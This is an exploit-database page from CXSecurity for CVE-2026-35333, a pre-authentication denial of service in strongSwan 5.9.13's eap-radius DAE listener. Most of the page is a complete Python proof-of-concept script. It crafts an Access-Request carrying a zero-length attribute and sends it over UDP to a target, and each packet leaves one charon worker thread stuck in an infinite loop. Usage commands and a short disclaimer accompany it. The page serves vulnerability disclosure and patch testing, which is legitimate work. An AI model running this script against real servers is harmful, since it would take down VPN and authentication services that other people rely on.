---
title: strongSwan 5.9.13 DoS
url: https://cxsecurity.com/issue/WLB-2026080007
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-08-12
fetch_date: 2026-08-13T04:02:47.715920
---

# strongSwan 5.9.13 DoS

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **strongSwan 5.9.13 DoS** **2026.08.12**  Credit:  **[Lukas Johannes Moeller](https://cxsecurity.com/author/Lukas%2BJohannes%2BMoeller/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-35333](https://cxsecurity.com/cveshow/CVE-2026-35333/ "Click to see CVE-2026-35333")**  CWE: **N/A** | |

# Exploit Title: strongSwan 5.9.13 - DoS
# Date: 2026-05-13
# Exploit Author: Lukas Johannes Moeller
# Vendor Homepage: https://www.strongswan.org/
# Software Link: https://download.strongswan.org/strongswan-5.9.13.tar.bz2
# Version: strongSwan <= 5.9.13 (eap-radius plugin built with DAE enabled)
# Tested on: Debian 12 bookworm, charon 5.9.13 built from upstream tarball,
# strongswan.conf charon.plugins.eap-radius.dae.enable = yes,
# listener bound on UDP/3799
# CVE: CVE-2026-35333
# References:
# https://github.com/strongswan/strongswan/commit/e067d24293
# https://nvd.nist.gov/vuln/detail/CVE-2026-35333
# https://github.com/JohannesLks/CVE-2026-35333
#
# Description:
# attribute\_enumerate() in src/libradius/radius\_message.c walks the
# attribute list of a RADIUS message without rejecting an attribute
# whose length byte is 0. For length == 0, this->next never advances
# and the per-attribute length computation `this->next->length -
# sizeof(rattr\_t)` underflows to (size\_t)-2. The result is an
# infinite loop pegging one charon worker thread at 100% CPU.
#
# The reachability detail that turns this into a pre-auth bug:
# radius\_message\_t::verify() uses the SAME broken iterator to find
# Message-Authenticator BEFORE the Response-Authenticator MD5 check
# is applied. For RADIUS code 1 (Access-Request) verify() skips the
# MD5 check entirely. So a malformed Access-Request with a single
# zero-length attribute as its first attribute traps the worker
# thread without any knowledge of the DAE shared secret.
#
# N packets exhaust N worker threads -> full DAE denial of service.
#
# Usage:
# python3 strongswan-5.9.13-radius-dae-dos.py --target 10.0.0.1
# python3 strongswan-5.9.13-radius-dae-dos.py --target 10.0.0.1 --count 8
#
# Observe on the target:
# ps -L -p $(pidof charon) -o tid,pcpu,stat,wchan:25,cmd
# -> one or more threads in state R at ~100% CPU, never returning.
#
# Disclaimer:
# For authorized testing and defensive research only. Do not use
# against systems you do not own or have explicit permission to test.
import argparse
import os
import socket
import struct
import sys
import time
ACCESS\_REQUEST = 1
RAT\_USER\_NAME = 1
def build\_zero\_length\_attr\_packet() -> bytes:
identifier = os.urandom(1)[0]
authenticator = os.urandom(16)
# 20-byte RADIUS header + 2-byte attribute (type=User-Name, length=0)
total\_len = 22
header = struct.pack("!BBH16s",
ACCESS\_REQUEST,
identifier,
total\_len,
authenticator)
attribute = struct.pack("!BB", RAT\_USER\_NAME, 0)
return header + attribute
def send\_packet(packet: bytes, target: str, port: int, wait: float) -> None:
sock = socket.socket(socket.AF\_INET, socket.SOCK\_DGRAM)
sock.settimeout(wait)
sock.sendto(packet, (target, port))
print(f"[+] sent {len(packet)} bytes to {target}:{port}/udp")
try:
data, addr = sock.recvfrom(4096)
print(f"[-] unexpected response {len(data)} bytes from {addr}:"
f" {data[:32].hex()}")
except socket.timeout:
print(f"[+] no response within {wait:.1f}s -- expected for hung worker")
finally:
sock.close()
def main() -> int:
p = argparse.ArgumentParser(
description="CVE-2026-35333 strongSwan RADIUS DAE pre-auth DoS"
)
p.add\_argument("--target", required=True,
help="DAE listener IPv4 address (e.g. 10.0.0.1)")
p.add\_argument("--port", type=int, default=3799,
help="DAE listener UDP port (default: 3799)")
p.add\_argument("--count", type=int, default=1,
help="Number of crafted packets to send (default: 1)")
p.add\_argument("--wait", type=float, default=2.0,
help="Per-packet response timeout in seconds (default: 2.0)")
args = p.parse\_args()
payload = build\_zero\_length\_attr\_packet()
for i in range(args.count):
print(f"\n[\*] crafted packet #{i + 1}: Access-Request with "
"zero-length User-Name attribute")
send\_packet(payload, args.target, args.port, args.wait)
time.sleep(0.2)
print("\n[+] done; expected effect: one charon worker thread per packet "
"stuck at 100% CPU.")
print(" Verify on the target with: ps -L -p $(pidof charon) "
"-o tid,pcpu,stat,wchan:25,cmd")
return 0
if \_\_name\_\_ == "\_\_main\_\_":
sys.exit(main())

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026080007)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top